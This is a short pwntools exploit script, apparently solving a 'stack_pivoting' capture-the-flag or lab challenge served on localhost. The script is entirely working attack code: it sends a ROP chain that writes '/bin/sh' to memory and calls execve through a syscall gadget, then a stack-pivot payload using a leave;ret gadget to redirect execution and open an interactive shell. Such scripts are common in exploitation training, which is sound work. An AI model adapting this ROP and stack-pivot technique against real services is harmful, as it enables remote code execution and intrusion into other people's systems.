from pwn import *

context.arch = 'amd64'

# r = process('../stack_pivoting/share/stack_pivoting')
r = remote('127.0.0.1', 10009)

rop = flat(
    0x00000000004048f4, # pop rsi ; ret
    0x49c230, # writable address
    0x0000000000417807, # pop rax ; ret
    b'/bin/sh\x00',
    0x0000000000418f31, # mov qword ptr [rsi], rax ; ret
    0x0000000000417807, # pop rax ; ret
    0x3b, # execve
    0x0000000000402008, # pop rdi ; ret
    0x49c230, # writable address
    0x00000000004048f4, # pop rsi ; ret
    0x0, # NULL
    0x00000000004563b7, # pop rdx ; pop rbx ; ret
    0x0, # NULL
    0x0, # NULL
    0x0000000000401291, # syscall
)
payload = b'A' * 0x8 + rop
r.sendlineafter(b"What's your name?\n",payload)
name = 0x000000000049db40
leave_ret = 0x0000000000401852
pivoting = b'A' * 0x10 + p64(name) + p64(leave_ret)
r.sendlineafter(b"Leave a message: \n",pivoting)
r.interactive()
